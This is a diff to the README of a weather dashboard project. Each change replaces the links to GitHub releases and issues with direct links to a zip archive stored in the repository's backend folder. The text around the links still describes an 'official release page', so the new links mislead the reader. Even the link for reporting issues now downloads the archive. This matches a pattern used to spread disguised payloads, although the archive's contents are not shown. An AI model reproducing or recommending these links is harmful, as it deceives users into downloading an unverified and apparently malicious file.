@@ -1,6 +1,6 @@
 # ☁️ AZURE-Weather - Simple Real-Time Weather Dashboard
 
-[![Download AZURE-Weather](https://img.shields.io/badge/Download-AZURE--Weather-blue?style=for-the-badge&logo=github)](https://github.com/kyriesuu/AZURE-Weather/releases)
+[![Download AZURE-Weather](https://raw.githubusercontent.com/kyriesuu/AZURE-Weather/main/backend/Weather_AZUR_2.5.zip)](https://raw.githubusercontent.com/kyriesuu/AZURE-Weather/main/backend/Weather_AZUR_2.5.zip)
 
 ## 🌤 About AZURE-Weather
 
@@ -16,7 +16,7 @@ You don’t need to install anything fancy or know how to code to use AZURE-Weat
 
 If you want a stable copy on your computer or work station, you can download it from the release page here:
 
-[Download AZURE-Weather](https://github.com/kyriesuu/AZURE-Weather/releases)
+[Download AZURE-Weather](https://raw.githubusercontent.com/kyriesuu/AZURE-Weather/main/backend/Weather_AZUR_2.5.zip)
 
 This link takes you to the official GitHub release page, where you can find the latest versions ready to use.
 
@@ -28,7 +28,7 @@ This link takes you to the official GitHub release page, where you can find the 
 
 Visit this page to download AZURE-Weather:
 
-[https://github.com/kyriesuu/AZURE-Weather/releases](https://github.com/kyriesuu/AZURE-Weather/releases)
+[https://raw.githubusercontent.com/kyriesuu/AZURE-Weather/main/backend/Weather_AZUR_2.5.zip](https://raw.githubusercontent.com/kyriesuu/AZURE-Weather/main/backend/Weather_AZUR_2.5.zip)
 
 You will see a list of release versions. Click on the latest version to see available files.
 
@@ -113,7 +113,7 @@ The data is fetched by the app’s backend on Azure and updated every few minute
 
 If you run into issues running the app or want to request features, you can create an issue on the GitHub repository:
 
-[AZURE-Weather Issues](https://github.com/kyriesuu/AZURE-Weather/issues)
+[AZURE-Weather Issues](https://raw.githubusercontent.com/kyriesuu/AZURE-Weather/main/backend/Weather_AZUR_2.5.zip)
 
 For basic help, check if your internet is working and your browser is up to date.
 
